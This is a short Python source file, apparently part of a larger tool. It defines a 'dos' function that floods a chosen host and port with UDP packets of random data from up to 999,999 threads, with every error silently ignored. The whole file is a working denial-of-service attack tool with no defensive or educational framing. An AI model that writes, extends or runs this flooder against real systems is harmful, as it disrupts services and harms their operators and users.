import random
import socket
import threading
from time import perf_counter

from .consts import COLOR, DATE


def dos(host=None, thread=None, port=None):
    if port == None:
        port = 8080
    if thread == None:
        thread = 999999
    print(host)
    print(port)
    print(thread)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(90240)

    def send_packets():
        while True:
            try:

                print(
                    f"{COLOR.WHITE}[{COLOR.BLUE}{DATE}{COLOR.WHITE}]{COLOR.YELLOW} Done Send new requests to {COLOR.GREEN}{host} "
                )
                sock.sendto(data, (host, port))
            except:
                pass

    start_time = perf_counter()  #! not accessed
    for i in range(thread):  #! not accessed
        t = threading.Thread(target=send_packets)
        t.daemon = True
        t.start()
